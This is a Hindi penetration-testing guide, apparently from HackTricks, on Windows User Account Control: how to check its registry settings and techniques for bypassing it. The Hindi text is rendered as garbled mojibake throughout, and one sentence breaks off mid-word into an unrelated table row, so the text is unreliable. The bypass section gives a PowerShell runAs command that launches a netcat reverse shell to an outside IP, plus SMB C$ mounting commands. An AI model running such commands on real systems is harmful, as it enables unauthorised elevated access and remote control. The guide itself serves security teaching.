# UAC - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ, рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ **рдЙрдЪреНрдЪрддрдо рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ**ред рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди `рдЕрдЦрдВрдбрддрд╛` рд╕реНрддрд░ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЬрд┐рд╕рдореЗрдВ **рдЙрдЪреНрдЪ рд╕реНрддрд░** рд╣реЛрддрд╛ рд╣реИ, рд╡рд╣ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЬрдм UAC рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдФрд░ рдХрд╛рд░реНрдп рд╣рдореЗрд╢рд╛ рдПрдХ рдЧреИрд░-рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЗ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓рддреЗ рд╣реИрдВ, рдЬрдм рддрдХ рдХрд┐ рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ/рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрддрд░ рдХреА рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЕрдзрд┐рдХреГрдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рдЕрдирдЬрд╛рдиреЗ рдмрджрд▓рд╛рд╡реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реАрдорд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

рдЬрдм UAC рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИ, рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ 2 рдЯреЛрдХрди рдорд┐рд▓рддреЗ рд╣реИрдВ: рдПрдХ рдорд╛рдирдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреБрдВрдЬреА, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд╛рдорд╛рдиреНрдп рд╕реНрддрд░ рдХреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рдХрд╛рд░реНрдп рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдПрдХ рдРрд╕рд╛ рдЯреЛрдХрди рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рд╢рд╛рд╕рдХ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВред

рдпрд╣ [рдкреГрд╖реНрда](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдЪрд░реНрдЪрд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ UAC рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдореЗрдВ рд▓реЙрдЧрдСрди рдкреНрд░рдХреНрд░рд┐рдпрд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрднрд╡ рдФрд░ UAC рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрдерд╛рдиреАрдп рд╕реНрддрд░ рдкрд░ (secpol.msc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХ
| [рдпреВрдЬрд░ рдЕрдХрд╛рдЙрдВрдЯ рдХрдВрдЯреНрд░реЛрд▓: рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬрд╝ рдлрд╝рд╛рдЗрд▓ рдФрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд▓рд┐рдЦрдиреЗ рдХреА рд╡рд┐рдлрд▓рддрд╛рдПрдВ рдкреНрд░рддрд┐-рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | рд╕рдХреНрд╖рдо                                                      |

### UAC рдмрд╛рдЗрдкрд╛рд╕ рд╕рд┐рджреНрдзрд╛рдВрдд

рдХреБрдЫ рдкреНрд░реЛрдЧреНрд░рд╛рдо **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрдЪреНрдЪрддрдо рдкрдж** рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рдЕрдЧрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рдореВрд╣** рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрди рдмрд╛рдЗрдирд░реА рдореЗрдВ рдЙрдирдХреЗ _**рдореИрдирд┐рдлреЗрд╕реНрдЯ**_ рдореЗрдВ _**autoElevate**_ рд╡рд┐рдХрд▓реНрдк рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рди _**True**_ рд╣реЛрддрд╛ рд╣реИред рдмрд╛рдЗрдирд░реА рдХреЛ **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд** рднреА рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдлрд┐рд░, **UAC** (рдордзреНрдпрдо рд╕рддреНрдпрд╛рдкрди рд╕реНрддрд░ рд╕реЗ рдЙрдЪреНрдЪ рд╕рддреНрдпрд╛рдкрди рд╕реНрддрд░ рдореЗрдВ рдЙрдардирд╛) рдХреЛ **рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ **рд╡рд┐рдЪрд┐рддреНрд░ рдХреЛрдб** рдХреЛ **рдЪрд▓рд╛ рд╕рдХреЗрдВ** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ **рдЙрдЪреНрдЪ рд╕рддреНрдпрд╛рдкрди рд╕реНрддрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛** рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк _Sysinternals_ рдХреЗ рдЙрдкрдХрд░рдг _**sigcheck.exe**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЗ _**рдореИрдирд┐рдлреЗрд╕реНрдЯ**_ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ рдЖрдк _Process Explorer_ рдпрд╛ _Process Monitor_ (Sysinternals рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ **рд╕рддреНрдпрд╛рдкрди рд╕реНрддрд░** рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

### UAC рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

UAC рд╕рдХреНрд╖рдо рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
рдпрджрд┐ рдпрд╣ **`1`** рд╣реИ рддреЛ UAC **рд╕рдХреНрд░рд┐рдп** рд╣реИ, рдпрджрд┐ рдпрд╣ **`0`** рд╣реИ рдпрд╛ рдпрд╣ **рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**, рддреЛ UAC **рдирд┐рд╖реНрдХреНрд░рд┐рдп** рд╣реИред

рдлрд┐рд░, **рдХреМрди рд╕рд╛ рд╕реНрддрд░** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЙрд╕реЗ рдЬрд╛рдВрдЪреЗрдВ:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* рдпрджрд┐ **`0`** рд╣реИ, рддреЛ UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдирд╣реАрдВ рд╣реЛрдЧрд╛ (рдЕрдХреНрд╖рдо рдХреА рддрд░рд╣)
* рдпрджрд┐ **`1`** рд╣реИ, рддреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЛ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдкреВрдЫрд╛ рдЬрд╛рддрд╛ рд╣реИ (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`2`** рд╣реИ (**рд╣рдореЗрд╢рд╛ рдореБрдЭреЗ рд╕реВрдЪрд┐рдд рдХрд░реЗрдВ**), рддреЛ UAC рд╣рдореЗрд╢рд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рдкреВрдЫреЗрдЧрд╛ рдЬрдм рд╡рд╣ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреБрдЫ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ (рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░)
* рдпрджрд┐ **`3`** рд╣реИ, рддреЛ `1` рдХреА рддрд░рд╣ рд╣реИ рд▓реЗрдХрд┐рди рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ
* рдпрджрд┐ **`4`** рд╣реИ, рддреЛ `2` рдХреА рддрд░рд╣ рд╣реИ рд▓реЗрдХрд┐рди рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ
* рдпрджрд┐ **`5`** (**рдбрд┐рдлрд╝реЙрд▓реНрдЯ**), рддреЛ рдпрд╣ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рдкреВрдЫреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рд╡рд╣ рдЧреИрд░ Windows рдмрд╛рдЗрдирд░реА рдХреЛ рдЙрдЪреНрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛

рдлрд┐рд░, рдЖрдкрдХреЛ **`LocalAccountTokenFilterPolicy`** рдХреА рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рд╣реЛрдЧреАред
рдпрджрд┐ рдорд╛рди **`0`** рд╣реИ, рддреЛ рдХреЗрд╡рд▓ **RID 500** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (**рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ**) рд╣реА **UAC рдХреЗ рдмрд┐рдирд╛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХрд╛рд░реНрдп** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдпрджрд┐ рдпрд╣ `1` рд╣реИ, рддреЛ **"Administrators"** рд╕рдореВрд╣ рдХреЗ рд╕рднреА рдЦрд╛рддреЗ рдЗрд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдФрд░, рдЕрдВрдд рдореЗрдВ **`FilterAdministratorToken`** рдХреА рдХреБрдВрдЬреА рдХреА рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
рдпрджрд┐ **`0`** (рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рд╣реИ, рддреЛ **рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддрд╛** рджреВрд░рд╕реНрде рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ **`1`** рд╣реИ, рддреЛ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдЦрд╛рддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ **рджреВрд░рд╕реНрде рдкреНрд░рд╢рд╛рд╕рди рдХрд╛рд░реНрдп рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдЬрдм рддрдХ `LocalAccountTokenFilterPolicy` рдХреЛ `1` рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#### рд╕рд╛рд░рд╛рдВрд╢

* рдпрджрд┐ `EnableLUA=0` рд╣реИ рдпрд╛ **рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**, рддреЛ **рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА UAC рдирд╣реАрдВ рд╣реИ**
* рдпрджрд┐ `EnableLua=1` рд╣реИ рдФрд░ **`LocalAccountTokenFilterPolicy=1` рд╣реИ, рддреЛ рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА UAC рдирд╣реАрдВ рд╣реИ**
* рдпрджрд┐ `EnableLua=1` рд╣реИ рдФрд░ **`LocalAccountTokenFilterPolicy=0`** рдФрд░ **`FilterAdministratorToken=0`** рд╣реИ, рддреЛ **RID 500 (рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд░рд╢рд╛рд╕рдХ) рдХреЗ рд▓рд┐рдП UAC рдирд╣реАрдВ рд╣реИ**
* рдпрджрд┐ `EnableLua=1` рд╣реИ рдФрд░ **`LocalAccountTokenFilterPolicy=0`** рдФрд░ **`FilterAdministratorToken=1`** рд╣реИ, рддреЛ **рд╕рднреА рдХреЗ рд▓рд┐рдП UAC рд╣реИ**

рдЗрд╕ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **metasploit** рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХрддреНрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `post/windows/gather/win_privs`

рдЖрдк рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рдореВрд╣реЛрдВ рдХреА рдЬрд╛рдВрдЪ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
net user %username%
whoami /groups | findstr Level
```
## UAC рдмрд╛рдИрдкрд╛рд╕

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рдЧреНрд░рд╛рдлрд┐рдХрд▓ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ UAC рдмрд╛рдИрдкрд╛рд╕ рд╕реАрдзрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдЖрддрд╛ рд╣реИ, рдЖрдк рдмрд╕ "рд╣рд╛рдБ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

UAC рдмрд╛рдИрдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИ: **UAC рд╕рдХреНрд╖рдо рд╣реИ, рдЖрдкрдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдорд╛рдзреНрдпрдо рдЕрдЦрдВрдбрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИ, рдФрд░ рдЖрдкрдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ**ред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпрджрд┐ UAC рд╕рдмрд╕реЗ рдЙрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ (рд╣рдореЗрд╢рд╛) рдореЗрдВ рд╣реИ, рддреЛ UAC рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛ **рдЕрдиреНрдп рд╕рднреА рд╕реНрддрд░реЛрдВ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рдореЗрдВ рд╣реЛрдиреЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХрдард┐рди рд╣реЛрддрд╛ рд╣реИ**ред

### UAC рдЕрдХреНрд╖рдо

рдпрджрд┐ UAC рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдХреНрд╖рдо рд╣реИ (`ConsentPromptBehaviorAdmin` **`0`** рд╣реИ), рддреЛ рдЖрдк **рдПрдбрдорд┐рди рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдХреЗ рд╕рд╛рде рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** (рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░) рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### рдЯреЛрдХрди рдбреБрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде UAC рдмрд╛рдИрдкрд╛рд╕

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **рдмрд╣реБрдд** рд╕рд╛рдзрд╛рд░рдг UAC "рдмрд╛рдИрдкрд╛рд╕" (рдкреВрд░реА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдПрдХреНрд╕реЗрд╕)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╢реЗрд▓ рд╣реИ рдЬреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рдореВрд╣ рдореЗрдВ рд╣реИ, рддреЛ рдЖрдк SMB (рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдЭрд╛ рдХреА рдЧрдИ C$ рдХреЛ **рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдкрдХреЛ **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рд╕рдмрдХреБрдЫ рдПрдХреНрд╕реЗрд╕ рд╣реЛрдЧрд╛** (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рднреА)ред

{% hint style="warning" %}
**рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЯреНрд░рд┐рдХ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рдХреЗ рд╕рд╛рде рдмрд╛рдИрдкрд╛рд╕ рдХрд░реЗрдВ

